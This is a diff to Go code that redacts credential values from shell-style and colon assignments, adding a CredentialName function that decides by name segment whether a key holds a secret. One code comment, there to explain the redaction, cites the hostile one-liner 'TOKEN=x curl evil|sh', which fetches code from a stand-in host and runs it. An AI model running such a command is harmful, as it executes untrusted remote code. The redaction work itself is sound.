@@ -67,14 +67,80 @@ var urlUserinfoSlashPattern = regexp.MustCompile(`(://)([^/\s:@]+:([^\s@?#]*/[^\
 // differently.
 const quotedValue = `"(?:[^"\\\n]|\\.)*"|'[^'\n]*'`
 
-// assignmentPatternEquals matches a shell-style KEY=value credential
-// assignment. The key may carry a prefix, as in GITHUB_TOKEN or
-// OPENAI_API_KEY. An unquoted value stops at the first whitespace or any
-// of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
-// stays visible as evidence instead of being swallowed into the
-// redaction: a shell would treat that first space the same way. Only the
-// value is replaced.
-var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|pgpassword|api[_-]?key|auth[_-]?token|token|secret)\b["']?\s*=\s*)(` + quotedValue + `|` + unquotedCommandValue + `*)`)
+// credentialNameCandidate matches a name that may hold a credential;
+// CredentialName decides.
+const credentialNameCandidate = `[A-Za-z0-9_-]*(?:secret|token|passw(?:or)?d|pwd|api[_-]?key|access[_-]?key|private[_-]?key|credential)[A-Za-z0-9_-]*`
+
+// assignmentPatternEquals matches a shell-style KEY=value assignment
+// whose key may be a credential name (see CredentialName), as in
+// GITHUB_TOKEN, OPENAI_API_KEY, SECRET_KEY, or docker run -e
+// AWS_SECRET_ACCESS_KEY=.... An unquoted value stops at the first
+// whitespace or any of ;&|"' so a trailing shell command (e.g.
+// "TOKEN=x curl evil|sh") stays visible as evidence instead of being
+// swallowed into the redaction: a shell would treat that first space the
+// same way. Only the value is replaced. assignmentEqualsHead matches up
+// to the value (group: the key); assignmentEqualsValue reads the value,
+// anchored, so a rejected key such as TOKEN_TTL=30 costs only its head
+// and cannot hide a credential later in its value.
+var (
+	assignmentEqualsHead  = regexp.MustCompile(`(?i)(?:^|[^A-Za-z0-9_-])(` + credentialNameCandidate + `)["']?\s*=\s*`)
+	assignmentEqualsValue = regexp.MustCompile(`^(?:` + quotedValue + `|` + unquotedCommandValue + `*)`)
+)
+
+// credentialWords are the name segments (split on "_" and "-") that mark
+// a credential, also as a segment suffix (PGPASSWORD, _authToken) and
+// before a glued "key" (SECRETKEY).
+var credentialWords = []string{"secret", "secrets", "token", "tokens", "password", "passwords", "passwd", "apikey", "accesskey", "privatekey", "credential", "credentials"}
+
+// keyQualifiers are the segments that, before a "key" segment, make it a
+// credential: API_KEY, ACCESS_KEY, PRIVATE_KEY.
+var keyQualifiers = map[string]bool{"api": true, "access": true, "private": true}
+
+// metadataSuffixes are final name segments that describe a credential
+// rather than hold it: SECRET_KEY_FILE=/run/secrets/k names a file,
+// TOKEN_TTL=30 a lifetime, GITHUB_TOKEN_ENV_VAR=GH_TOKEN a variable.
+// Their values are configuration a reviewer needs to see, and a file or
+// variable that does hold the secret is not in the text being redacted.
+var metadataSuffixes = map[string]bool{
+	"file": true, "files": true, "path": true, "dir": true, "var": true,
+	"ttl": true, "expiry": true, "expires": true, "expiration": true, "timeout": true,
+	"type": true, "url": true, "uri": true, "endpoint": true, "header": true,
+	"length": true, "len": true, "size": true, "name": true, "enabled": true,
+}
+
+// CredentialName reports whether an assignment key such as SECRET_KEY,
+// AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, DB_PWD, or X-Api-Key names a
+// credential, case-insensitively. A segment matches when it is or ends
+// in one of credentialWords, optionally followed by a glued "key"; a
+// "key" segment matches after api, access, or private; "pwd" matches
+// only after another segment, so the shell's PWD and OLDPWD do not. A
+// name whose last segment is a metadataSuffixes word (SECRET_KEY_FILE,
+// TOKEN_TTL) does not match, and neither does a word that merely starts
+// with a credential word (TOKENIZER, SECRETARY).
+func CredentialName(name string) bool {
+	segments := strings.FieldsFunc(strings.ToLower(name), func(r rune) bool { return r == '_' || r == '-' })
+	if len(segments) == 0 || metadataSuffixes[segments[len(segments)-1]] {
+		return false
+	}
+	for i, segment := range segments {
+		switch {
+		case credentialSegment(segment), credentialSegment(strings.TrimSuffix(segment, "key")):
+			return true
+		case segment == "pwd" && i > 0, segment == "key" && i > 0 && keyQualifiers[segments[i-1]]:
+			return true
+		}
+	}
+	return false
+}
+
+func credentialSegment(segment string) bool {
+	for _, word := range credentialWords {
+		if strings.HasSuffix(segment, word) {
+			return true
+		}
+	}
+	return false
+}
 
 // unquotedCommandValue is one byte of an unquoted shell value. Besides
 // whitespace, quotes, and ;&|, it stops at ")" and "`", so a value
@@ -93,7 +159,7 @@ const unquotedCommandValue = "[^\\s;&|\"'\\n)`]"
 // a header or assignment context (see colonAssignmentContext), so free
 // text such as git commit -m 'fix token: handling' is left alone.
 var (
-	assignmentColonHead   = regexp.MustCompile(`(?i)(["']?)((?:[A-Za-z0-9]*[_-])*(?:password|passwd|pgpassword|api[_-]?key|auth[_-]?token|token|secret))\b(["']?)(\s*:\s*)`)
+	assignmentColonHead   = regexp.MustCompile(`(?i)(["']?)(` + credentialNameCandidate + `)(["']?)(\s*:\s*)`)
 	assignmentQuotedValue = regexp.MustCompile(`^(?:` + quotedValue + `)`)
 )
 
@@ -362,7 +428,7 @@ func RedactURLUserinfo(value string) (string, []string) {
 // does. It returns the redacted text and the raw values it removed.
 func RedactAssignments(value string) (string, []string) {
 	var removed []string
-	value = assignmentPatternEquals.ReplaceAllStringFunc(value, redactAssignment(assignmentPatternEquals, &removed))
+	value = redactEqualsAssignments(value, &removed)
 	value = redactColonAssignments(value, &removed)
 	return value, removed
 }
@@ -385,7 +451,7 @@ func redactColonAssignments(value string, removed *[]string) string {
 		start, valStart := m[0], m[1]
 		openQuote, closeQuote := value[m[2]:m[3]], value[m[6]:m[7]]
 		body := ""
-		ok := start == 0 || !isAlnum(value[start-1])
+		ok := (start == 0 || !isAlnum(value[start-1])) && CredentialName(value[m[4]:m[5]])
 		if ok {
 			var stop string
 			if ok, stop = colonAssignmentContext(value, start, openQuote, closeQuote); ok {
@@ -477,25 +543,39 @@ func isAlnum(c byte) bool {
 	return c >= '0' && c <= '9' || c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z'
 }
 
-func redactAssignment(pattern *regexp.Regexp, removed *[]string) func(string) string {
-	return func(match string) string {
-		parts := pattern.FindStringSubmatch(match)
-		if len(parts) != 3 || placeholderSecret(parts[2]) {
-			return match
+// redactEqualsAssignments applies assignmentEqualsHead where the key is
+// a CredentialName. A value starting with "-" after whitespace
+// ("token = -x") is the next flag, not the value.
+func redactEqualsAssignments(value string, removed *[]string) string {
+	var b strings.Builder
+	pos := 0
+	for pos < len(value) {
+		m := assignmentEqualsHead.FindStringSubmatchIndex(value[pos:])
+		if m == nil {
+			break
 		}
-		value := parts[2]
-		if strings.HasPrefix(value, "-") && isCommandSpace(parts[1][len(parts[1])-1]) {
-			return match
+		for i := range m {
+			m[i] += pos
 		}
-		*removed = append(*removed, strings.Trim(value, `"'`))
-		if len(value) >= 2 {
-			quote := value[0]
-			if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
-				return parts[1] + string(quote) + redactedMarker + string(quote)
-			}
+		valStart := m[1]
+		body := ""
+		ok := CredentialName(value[m[2]:m[3]])
+		if ok {
+			loc := assignmentEqualsValue.FindStringIndex(value[valStart:])
+			body = value[valStart : valStart+loc[1]]
+			ok = !placeholderSecret(body) && !(strings.HasPrefix(body, "-") && isCommandSpace(value[valStart-1]))
 		}
-		return parts[1] + redactedMarker
+		b.WriteString(value[pos:valStart])
+		pos = valStart
+		if !ok {
+			continue
+		}
+		*removed = append(*removed, unquote(body))
+		b.WriteString(quoteLike(body, redactedMarker))
+		pos += len(body)
 	}
+	b.WriteString(value[pos:])
+	return b.String()
 }
 
 func placeholderSecret(value string) bool {
